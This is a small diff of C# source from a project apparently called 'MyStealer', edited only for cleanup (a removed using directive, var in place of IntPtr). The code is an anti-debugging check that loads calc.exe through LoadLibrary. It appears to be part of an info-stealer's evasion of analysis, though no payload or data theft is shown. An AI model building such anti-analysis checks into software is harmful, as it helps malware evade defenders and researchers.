@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.Text;
 using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug.Check.Exploits
@@ -16,7 +15,7 @@ namespace MyStealer.AntiDebug.Check.Exploits
         public override bool CheckPassive()
         {
             var path = Path.Combine(Environment.SystemDirectory, "calc.exe"); // Try to load calculator XD
-            IntPtr lib = IntPtr.Zero;
+            var lib = IntPtr.Zero;
             try
             {
                 lib = LoadLibrary(path);
